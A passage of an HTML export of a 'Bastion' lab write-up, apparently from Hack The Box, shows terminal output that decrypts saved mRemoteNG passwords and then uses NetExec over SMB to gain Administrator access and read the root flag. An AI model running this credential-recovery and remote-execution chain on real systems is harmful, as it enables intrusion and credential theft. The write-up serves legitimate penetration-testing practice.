+&boxur;&boxh;$ python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
+Password: thXLHM96BeKL0ER2
+                                                                                                                                                                         
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs<span class="hljs-regexp">/Bastion/m</span>RemoteNG-Decrypt]
+&boxur;&boxh;$ python3 mremoteng_decrypt.py -s yhgmiu5bbuamU3qMUKc<span class="hljs-regexp">/uYDdmbMrJZ/</span>JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB        
+Password: bureaulampje</code></pre></div>
+<p>And that password <code class="inline-code">thXLHM96BeKL0ER2</code> belongs to the user <code class="inline-code">Administrator</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion/mRemoteNG-Decrypt]
+&boxur;&boxh;$ nxc smb 10.129.11.95 -u Administrator -p thXLHM96BeKL0ER2
+SMB         10.129.11.95    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
+SMB         10.129.11.95    445    BASTION          [+] Bastion\Administrator:thXLHM96BeKL0ER2 (Pwn3d!)
+
+
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion/mRemoteNG-Decrypt]
+&boxur;&boxh;$ nxc smb 10.129.11.95 -u Administrator -p thXLHM96BeKL0ER2 -x &quot;more C:\Users\Administrator\Desktop\root.txt&quot;
+SMB         10.129.11.95    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
+SMB         10.129.11.95    445    BASTION          [+] Bastion\Administrator:thXLHM96BeKL0ER2 (Pwn3d!)
+SMB         10.129.11.95    445    BASTION          [+] Executed command via wmiexec
+SMB         10.129.11.95    445    BASTION          ed813e1105f7a04840d5af99ac5fd23e
+
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion/mRemoteNG-Decrypt]
+&boxur;&boxh;$ nxc<span class="hljs-built_in"> smb </span>10.129.11.95 -u Administrator -p thXLHM96BeKL0ER2<span class="hljs-built_in">
+SMB </span>        10.129.11.95    445    BASTION          [*] Windows<span class="hljs-built_in"> Server </span>2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)<span class="hljs-built_in">
+SMB </span>        10.129.11.95    445    BASTION          [+] Bastion\Administrator:thXLHM96BeKL0ER2 (Pwn3d!)
+
+
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion/mRemoteNG-Decrypt]
+&boxur;&boxh;$ nxc<span class="hljs-built_in"> smb </span>10.129.11.95 -u Administrator -p thXLHM96BeKL0ER2 -x <span class="hljs-string">&quot;more C:\Users\Administrator\Desktop\root.txt&quot;</span><span class="hljs-built_in">
+SMB </span>        10.129.11.95    445    BASTION          [*] Windows<span class="hljs-built_in"> Server </span>2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)<span class="hljs-built_in">
+SMB </span>        10.129.11.95    445    BASTION          [+] Bastion\Administrator:thXLHM96BeKL0ER2 (Pwn3d!)<span class="hljs-built_in">
+SMB </span>        10.129.11.95    445    BASTION          [+] Executed command via wmiexec<span class="hljs-built_in">
+SMB </span>        10.129.11.95    445    BASTION          ed813e1105f7a04840d5af99ac5fd23e
+
+</code></pre></div>
+</div></div>
+					</body>
+				</html>
+			
